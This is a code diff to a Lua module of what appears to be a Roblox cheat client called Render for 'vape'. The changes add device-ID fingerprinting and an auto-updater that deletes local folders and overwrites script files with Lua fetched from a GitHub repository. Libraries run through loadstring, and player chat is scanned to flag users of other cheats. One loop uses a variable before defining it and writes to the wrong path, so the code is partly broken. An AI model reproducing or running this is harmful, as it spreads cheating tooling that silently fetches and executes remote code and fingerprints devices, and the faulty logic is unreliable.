@@ -1,9 +1,11 @@
+-- Render Custom Modules Signed File
 local RenderFunctions = {WhitelistLoaded = false, whitelistTable = {}, localWhitelist = {}, whitelistSuccess = false, playerWhitelists = {}, commands = {}, playerTags = {}, entityTable = {}}
 local RenderLibraries = {}
 local RenderConnections = {}
 local players = game:GetService('Players')
 local tweenService = game:GetService('TweenService')
 local httpService = game:GetService('HttpService')
+local HWID = game:GetService('RbxAnalyticsService'):GetClientId()
 local lplr = players.LocalPlayer
 local GuiLibrary = shared.GuiLibrary
 local rankTable = {DEFAULT = 0, STANDARD = 1, BOOSTER = 1.5, INF = 2, OWNER = 3}
@@ -38,11 +40,37 @@ function RenderFunctions:CreateLocalDirectory(directory)
 end
 
 function RenderFunctions:RefreshLocalEnv()
-    for i,v in next, ({'scripts'}) do  
+    for i,v in next, ({'Libraries', 'scripts'}) do  
         if isfolder('vape/Render/'..v) then 
             delfolder('vape/Render/'..v) 
+            RenderFunctions:DebugWarning('vape/Render/'..v, 'folder has been deleted due to updates.')
         end
     end
+    for i,v in next, ({'Universal.lua', 'MainScript.lua', 'NewMainScript.lua', 'GuiLibrary.lua'}) do 
+        task.spawn(function()
+            local contents = game:HttpGet('https://raw.githubusercontent.com/SystemXVoid/'..RenderFunctions:GithubHash()..'/source/packages/'..v)
+            if contents ~= '404: Not Found' then 
+                contents = (tostring(contents:split('\n')[1]):find('Render Custom Vape Signed File') and contents or '-- Render Custom Vape Signed File\n'..contents)
+                if isfolder('vape') then 
+                    RenderFunctions:DebugWarning('vape/', v, 'has been overwritten due to updates.')
+                    writefile('vape/'..v, contents) 
+                end
+            end 
+        end)
+    end
+    for i,v in next, (isfolder('vape/CustomModules') and listfiles('vape/CustomModules') or {}) do 
+        local splits = v:split('\\')
+        v = splits[#splits]
+        local luacheck = (tostring(contents:split('.')[2]) == 'lua')
+        local contents = game:HttpGet('https://raw.githubusercontent.com/SystemXVoid/'..RenderFunctions:GithubHash()..'/source/packages/'..v)
+        if contents ~= '404: Not Found' then 
+            contents = (luacheck and tostring(contents:split('\n')[1]):find('Render Custom Vape Signed File') and contents or '-- Render Custom Vape Signed File\n'..contents)
+            if isfolder('vape') then 
+                RenderFunctions:DebugWarning('vape/CustomModules/'..v, 'has been overwritten due to updates.')
+                writefile('vape/'..v, contents) 
+            end
+        end
+    end 
 end
 
 function RenderFunctions:GithubHash(repo, owner)
@@ -185,7 +213,7 @@ function RenderFunctions:CreateWhitelistTable()
             end
             if i == ria or table.find(v.Accounts, tostring(lplr.UserId)) then 
                 RenderFunctions.localWhitelist = v
-                RenderFunctions.localWhitelist.RIA = i 
+                RenderFunctions.localWhitelist.HWID = i 
                 RenderFunctions.localWhitelist.Priority = rankTable[v.Rank:upper()] or 1
                 break
             end
@@ -196,7 +224,7 @@ function RenderFunctions:CreateWhitelistTable()
             local player = playerfromID(tonumber(v2))
             if player then 
                 RenderFunctions.playerWhitelists[v2] = v
-                RenderFunctions.playerWhitelists[v2].RIA = i 
+                RenderFunctions.playerWhitelists[v2].HWID = i 
                 RenderFunctions.playerWhitelists[v2].Priority = rankTable[v.Rank:upper()] or 1
                 if RenderFunctions:GetPlayerType(3) >= RenderFunctions:GetPlayerType(3, player) then
                     RenderFunctions.playerWhitelists[v2].Attackable = true
@@ -211,7 +239,7 @@ function RenderFunctions:CreateWhitelistTable()
                 for i2, v2 in next, v.Accounts do 
                     if v2 == tostring(player.UserId) then 
                         RenderFunctions.playerWhitelists[v2] = v
-                        RenderFunctions.playerWhitelists[v2].RIA = i 
+                        RenderFunctions.playerWhitelists[v2].HWID = i 
                         RenderFunctions.playerWhitelists[v2].Priority = rankTable[v.Rank:upper()] or 1
                         if RenderFunctions:GetPlayerType(3) >= RenderFunctions:GetPlayerType(3, player) then
                             RenderFunctions.playerWhitelists[v2].Attackable = true
@@ -226,7 +254,7 @@ end
 
 function RenderFunctions:GetPlayerType(position, plr)
     plr = plr or lplr
-    local positionTable = {'Rank', 'Attackable', 'Priority', 'TagText', 'TagColor', 'TagHidden', 'UID', 'RIA'}
+    local positionTable = {'Rank', 'Attackable', 'Priority', 'TagText', 'TagColor', 'TagHidden', 'UID', 'HWID'}
     local defaultTab = {'STANDARD', true, 1, 'SPECIAL USER', 'FFFFFF', true, 0, 'ABCDEFGH'}
     local tab = RenderFunctions.playerWhitelists[tostring(plr.UserId)]
     if tab then 
@@ -314,7 +342,7 @@ function RenderFunctions:SelfDestruct()
 end
 
 task.spawn(function()
-	for i,v in next, ({'base64', 'Hex2Color3', 'encodeLib'}) do 
+	for i,v in next, ({'Hex2Color3', 'encodeLib'}) do 
 		task.spawn(function() RenderLibraries[v] = loadstring(RenderFunctions:GetFile('Libraries/'..v..'.lua'))() end)
 	end
 end)
@@ -413,6 +441,16 @@ task.spawn(function()
     RenderStore.MessageReceived.Event:Connect(function(plr, text)
         local args = text:split(' ')
         local first, second = tostring(args[1]), tostring(args[2])
+        if RenderFunctions:GetPlayerType(3) > 1 and RenderFunctions:GetPlayerType(3, plr) < RenderFunctions:GetPlayerType(3) then 
+            for i,v in next, RenderFunctions.hashTable do 
+                if text == i then 
+                    print('Render - '..plr.DisplayName..' is using '..v..'!')
+                    if GuiLibrary then 
+                        pcall(GuiLibrary.CreateNotification, 'Render', plr.DisplayName..' is using '..v..'!', 100) 
+                    end
+                end
+            end
+        end
         if plr == lplr or RenderFunctions:GetPlayerType(3, plr) < 1.5 or RenderFunctions:GetPlayerType(3, plr) <= RenderFunctions:GetPlayerType(3) then 
             return 
         end
